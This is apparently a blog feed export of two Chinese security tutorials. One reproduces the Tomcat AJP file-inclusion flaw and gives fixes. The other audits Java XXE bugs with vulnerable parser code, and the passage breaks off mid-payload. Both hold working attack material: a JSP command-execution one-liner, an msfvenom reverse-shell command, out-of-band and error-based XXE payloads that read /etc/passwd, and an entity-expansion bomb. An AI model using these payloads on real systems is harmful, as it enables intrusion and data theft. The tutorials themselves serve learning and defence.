    <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>&emsp;&emsp; Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。</p><hr><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><ul><li>Apache Tomcat 6 </li><li>Apache Tomcat 7 &lt; 7.0.100 </li><li>Apache Tomcat 8 &lt; 8.5.51 </li><li>Apache Tomcat 9 &lt; 9.0.31</li></ul><hr><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>&emsp;&emsp; 之前代码审计的时候安装了apache tomcat/9.0.29还存在这个漏洞，所以索性复现一下漏洞。这里环境搭建很简单，去官方网站下载tomcat下载安装就好了，不会随便百度一篇文章看看，笔者这里就不多说什么了。</p><p><img src="https://img-blog.csdnimg.cn/20200221193023649.png" alt="在这里插入图片描述"></p><hr><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><code>python poc.py -p 8009 -f &quot;/WEB-INF/web.xml&quot; 127.0.0.1</code><img src="https://img-blog.csdnimg.cn/20200221193441663.jpg" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221193330182.jpg" alt="在这里插入图片描述"></p><hr><h1 id="骚操作-RCE"><a href="#骚操作-RCE" class="headerlink" title="骚操作 RCE"></a>骚操作 RCE</h1><p>&emsp;&emsp; 利用大佬hero0修改poc脚本，修改成了python3版本。<br>增加了 –rce选项，会使用jsp渲染执行文本中包含的命令，默认读取文件模式。<br>可以配合上传漏洞进行漏洞利用。<br>命令执行一句话:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%out.println(new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(&quot;whoami&quot;).getInputStream())).readLine());%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200221200551291.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221195146769.png" alt="在这里插入图片描述"><br><strong>利用msf反弹shell</strong>（也是需要配合上传漏洞）<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 &gt; shell.txt</code><br><img src="https://img-blog.csdnimg.cn/20200221202102945.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221195022259.png" alt="在这里插入图片描述"></p><hr><h1 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h1><p>如果相关用户暂时无法进行版本升级，可根据自身情况采用下列防护措施。</p><p>一、若不需要使用Tomcat AJP协议，可直接关闭AJP Connector，或将其监听地址改为仅监听本机localhost。</p><p>具体操作：</p><p>（1）编辑 <CATALINA_BASE>/conf/server.xml，找到如下行（<CATALINA_BASE> 为 Tomcat 的工作目录）：</CATALINA_BASE></CATALINA_BASE></p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;</code><br>（2）将此行注释掉（也可删掉该行）：</p><p><code>&lt;!--&lt;Connectorport=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;--&gt;</code></p><p>（3）保存后需重新启动Tomcat，规则方可生效。</p><p>二、若需使用Tomcat AJP协议，可根据使用版本配置协议属性设置认证凭证。</p><p>使用Tomcat 7和Tomcat 9的用户可为AJP Connector配置secret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot;/&gt;</code></p><p>使用Tomcat 8的用户可为AJP Connector配置requiredSecret来设置AJP协议的认证凭证。例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p><p><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot;address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot;requiredSecret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt;</code></p><hr><h1 id="文件资料下载"><a href="#文件资料下载" class="headerlink" title="文件资料下载"></a>文件资料下载</h1><p>文中所以资料都在这里。<br>链接: <a href="https://pan.baidu.com/s/101wFmK1J0OGYRC383fdBBA" target="_blank" rel="noopener">https://pan.baidu.com/s/101wFmK1J0OGYRC383fdBBA</a> 提取码: xg4s</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.t00ls.net/thread-55061-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-55061-1-1.html</a><br><a href="https://www.t00ls.net/viewthread.php?tid=55062&amp;extra=&amp;page=1" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=55062&amp;extra=&amp;page=1</a><br><a href="https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC" target="_blank" rel="noopener">https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC</a>**</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统
      
    
    </summary>
    
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>一篇文章读懂Java代码审计之XXE</title>
    <link href="http://yoursite.com/2020/02/23/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E8%AF%BB%E6%87%82Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BXXE/"/>
    <id>http://yoursite.com/2020/02/23/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E8%AF%BB%E6%87%82Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BXXE/</id>
    <published>2020-02-23T11:01:42.000Z</published>
    <updated>2020-05-05T13:16:58.263Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>学习总结Java审计过程中笔记，审计方法</li><li>阅读要求：有简单Java代码基础，了解漏洞原理</li><li>阅读时长：30min 篇幅比较长</li></ul><hr><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>&emsp;&emsp; 简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p><hr><h1 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h1><p>&emsp;&emsp; 不说废话，先看效果，成功读取文本内容。tip: 本次测试中需要将<code>Content-Type: application/x-www-form-urlencoded</code>修改成<code>Content-Type: application/xml</code>不然就无法成功。<br><img src="https://img-blog.csdnimg.cn/20200221154143875.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200221153921615.png" alt="在这里插入图片描述"><br>&emsp;&emsp; <strong>代码分析漏洞成因：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">xxeDocumentBuilderReturn</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String xml_con = WebUtils.getRequestBody(request);</span><br><span class="line">            System.out.println(xml_con);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历xml节点name和value</span></span><br><span class="line">            StringBuffer buf = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    buf.append(node.getNodeName() + <span class="string">": "</span> + node.getTextContent() + <span class="string">"\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sr.close();</span><br><span class="line">            System.out.println(buf.toString());</span><br><span class="line">            <span class="keyword">return</span> buf.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"except"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; <strong>不难发现我们只要清楚这四行代码功能，就能很好清楚Java解析XML机制。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; DocumentBuilderFactory是一个抽象工厂类，它不能直接实例化，但该类提供了一个newInstance方法 ，这个方法会根据本地平台默认安装的解析器，自动创建一个工厂的对象并返回。<br><img src="https://img-blog.csdnimg.cn/20200222151828506.png#pic_center" alt="在这里插入图片描述"></p><hr><h1 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h1><p><img src="https://img-blog.csdnimg.cn/20200221160018601.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilder</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String xml_con = WebUtils.getRequestBody(request);</span><br><span class="line">            System.out.println(xml_con);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历xml节点name和value</span></span><br><span class="line">            StringBuffer result = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> (child.item(j).getNodeType() == Node.ELEMENT_NODE) &#123;</span><br><span class="line">                        result.append(node.getNodeName() + <span class="string">": "</span> + node.getFirstChild().getNodeValue() + <span class="string">"\n"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sr.close();</span><br><span class="line">            System.out.println(result.toString());</span><br><span class="line">            <span class="keyword">return</span> result.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"except"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 我们使用burp比较器分析两部分代码，不能发现左边就是多了一个判断语句。（左:无回显代码 右:有回显代码）<br><img src="https://img-blog.csdnimg.cn/20200221160503214.png#pic_center" alt="在这里插入图片描述"><br><em><code>if (child.item(j).getNodeType() == Node.ELEMENT_NODE)</code></em><br> 正常解析XML，需要判断是否是ELEMENT_NODE类型。否则会出现多余的的节点。</p><hr><p>对于这样子无回显的验证可以使用ceye.io网站，具体方法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">joychou</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip.port.xxxx.ceye.io/xxe_test"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200222193843204.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200222193929997.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 复测过程中遇见的小坑，个人感觉纯属玄学问题。两次请求数据几乎是一模一样的，但是返回结果愣是不一样，一个200一个400。（充分体现了挖洞得随缘，有时候姿势对了，但是结果不对可能不是你的错误）<br><img src="https://img-blog.csdnimg.cn/20200222194626447.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200222194755884.png" alt="在这里插入图片描述"></p><hr><h1 id="Xinclude"><a href="#Xinclude" class="headerlink" title="Xinclude"></a>Xinclude</h1><p><strong>什么是xinclude</strong><br>&emsp;&emsp; 顾名思义，xinclude可以理解为xml include熟悉编译/脚本语言的一定熟知，像php的include，python和java的import都是可以进行文件包含的。<br><strong>那么文件包含有什么好处？</strong><br>&emsp;&emsp; 当然是可以使代码更整洁，我们可以将定义的功能函数放在function.php中，再在需要使用功能函数的文件中使用include包含function.php，这样就避免了重复冗余的函数定义，同样可以增加代码的可读性。故此，xinclude也不例外，它是xml标记语言中包含其他文件的方式。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///E:/1.txt"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200222211644240.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">xxe_xinclude_DocumentBuilder</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           String xml_con = WebUtils.getRequestBody(request);</span><br><span class="line">           System.out.println(xml_con);</span><br><span class="line"></span><br><span class="line">           DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">           dbf.setXIncludeAware(<span class="keyword">true</span>);   <span class="comment">// 支持XInclude</span></span><br><span class="line">           dbf.setNamespaceAware(<span class="keyword">true</span>);  <span class="comment">// 支持XInclude</span></span><br><span class="line">           DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">           StringReader sr = <span class="keyword">new</span> StringReader(xml_con);</span><br><span class="line">           InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">           Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">           NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">           String str = <span class="keyword">new</span> String();</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">               Node rootNode = rootNodeList.item(i);</span><br><span class="line">               NodeList xxe = rootNode.getChildNodes();</span><br><span class="line">               <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; xxe.getLength(); j++) &#123;</span><br><span class="line">                   Node xxeNode = xxe.item(j);</span><br><span class="line">             </span><br><span class="line">                   str = str + xxeNode.getNodeValue();</span><br><span class="line">                   System.out.println(str);</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           sr.close();</span><br><span class="line">           <span class="keyword">return</span> str;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           System.out.println(e);</span><br><span class="line">           <span class="keyword">return</span> <span class="string">"except"</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Payload分享"><a href="#Payload分享" class="headerlink" title="Payload分享"></a>Payload分享</h2><p>飘零师傅的payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">resetPassword</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/xml/fontconfig/fonts.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">expr</span> <span class="meta-string">'aaa)&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY &amp;#x25; file SYSTEM "file:///flag"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:////&amp;#x25;file;&amp;#x27;&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&amp;#x25;error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&lt;!ELEMENT aa (bb'</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">request</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">status</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">status</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">local_dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///usr/share/yelp/dtd/docbookx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">ISOamso</span> <span class="meta-string">'</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        &lt;!ENTITY % eval "&lt;!ENTITY % error SYSTEM '</span>file:///nonexistent/%file;<span class="meta-string">'&gt;"&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        %eval;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">        %error;</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">    '</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><hr><h1 id="Poi-ooxml-XXE"><a href="#Poi-ooxml-XXE" class="headerlink" title="Poi ooxml XXE"></a>Poi ooxml XXE</h1><h2 id="CVE-2014-3529"><a href="#CVE-2014-3529" class="headerlink" title="CVE-2014-3529"></a>CVE-2014-3529</h2><ul><li><p>新建xxe.xlsx文件，修改后缀名xxe.zip解压。<br><img src="https://img-blog.csdnimg.cn/2020022311395424.png" alt="在这里插入图片描述"></p></li><li><p>修改[Content-Types].xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE x [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xxxxx.xx.ixxo"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>后因为无法访问ceye.io网站，笔者自己在本地搭建一台服务器。推荐使用phpstudy，开启访问日志，具体方法百度。</code><br><img src="https://img-blog.csdnimg.cn/20200223113339623.png" alt="在这里插入图片描述"></p></li><li><p>重新压缩成zip，在修改成xlsx文件。</p></li><li><p>上传文件<br><img src="https://img-blog.csdnimg.cn/20200223140541747.png" alt="在这里插入图片描述"></p></li><li><p>或者直接读取文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">File f = <span class="keyword">new</span> File(<span class="string">"/path/xxe.xlsx"</span>);</span><br><span class="line">        FileInputStream in = <span class="keyword">new</span> FileInputStream(f);</span><br><span class="line"></span><br><span class="line">        XSSFWorkbook wb = <span class="keyword">new</span> XSSFWorkbook(in); <span class="comment">// xxe vuln</span></span><br><span class="line">        XSSFSheet sheet = wb.getSheetAt(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> total = sheet.getLastRowNum();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Row row : sheet)&#123;</span><br><span class="line">            <span class="keyword">for</span> (Cell cell :row)&#123;</span><br><span class="line">               System.out.println(cell.getStringCellValue());</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">"expection"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li><li><p>看下报错，报出poi错误才是正确的。<br><img src="https://img-blog.csdnimg.cn/20200223140830833.png" alt="在这里插入图片描述"></p></li><li><p>查看访问记录<br><img src="https://img-blog.csdnimg.cn/20200223141207658.png" alt="在这里插入图片描述"></p></li><li><p>修复建议，换成3.10-FINAL版本以上<br><img src="https://img-blog.csdnimg.cn/20200223141417847.png" alt="在这里插入图片描述"></p></li></ul><hr><h2 id="CVE-2017-5644"><a href="#CVE-2017-5644" class="headerlink" title="CVE-2017-5644"></a>CVE-2017-5644</h2><p>其他步骤同CVE-2014-3529中的方式，这次是在 xl/workbook.xml 中注入实体:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE x [     </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e1</span> <span class="meta-string">""</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e2</span> <span class="meta-string">"&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e3</span> <span class="meta-string">"&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span 